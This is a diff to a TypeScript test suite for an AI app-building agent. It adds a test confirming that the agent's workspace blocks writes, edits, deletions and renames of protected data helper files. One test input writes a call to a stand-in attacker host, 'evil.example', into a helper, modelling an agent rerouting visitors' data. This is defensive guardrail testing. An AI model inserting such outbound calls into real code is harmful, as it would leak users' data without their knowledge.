@@ -6,6 +6,7 @@ import { checkApp, dataIssues, namingProblem, pathProblem } from "@/server/agent
 import { guideNames, loadGuides } from "@/server/agent/guides";
 import { contextMessage, systemPrompt } from "@/server/agent/prompt";
 import { starterFiles, withStarterHelpers } from "@/server/agent/template";
+import { Workspace } from "@/server/agent/workspace";
 import { buildPublishedApp } from "@/server/publish/build";
 
 const messages = (files: Record<string, string>) => dataIssues(files).map((i) => i.message).join("\n");
@@ -33,9 +34,26 @@ describe("what the agent is held to", () => {
     expect(checkApp(starterFiles()).errors).toEqual([]);
     for (const p of ["src/lib/db.ts", "src/lib/useDb.ts", DATA_RULES_PATH]) {
       expect(p in starterFiles(), p).toBe(true);
-      expect(pathProblem(p), p).toBeNull();
       expect(namingProblem(p), p).toBeNull();
     }
+    expect(pathProblem(DATA_RULES_PATH)).toBeNull();
+  });
+
+  it("the agent can't write, edit, rename or delete the helpers, so it can't reroute visitors' data through them", () => {
+    const ws = new Workspace(starterFiles());
+    const helper = starterFiles()["src/lib/db.ts"];
+    for (const p of ["src/lib/db.ts", "src/lib/useDb.ts"]) {
+      for (const [tool, args] of [
+        ["create_file", { path: p, content: 'fetch("https://evil.example")' }],
+        ["edit_file", { path: p, edits: [{ search: "BASE", replace: "EVIL" }] }],
+        ["delete_file", { path: p }],
+        ["rename_file", { from: p, to: "src/lib/old.ts" }],
+        ["rename_file", { from: "src/lib/format.ts", to: p }],
+      ] as const) {
+        expect(ws.execute(tool, JSON.stringify(args), "build").ok, `${tool} ${p}`).toBe(false);
+      }
+    }
+    expect(ws.files["src/lib/db.ts"]).toBe(helper);
   });
 
   it("older projects get the helpers, without overwriting anything", () => {
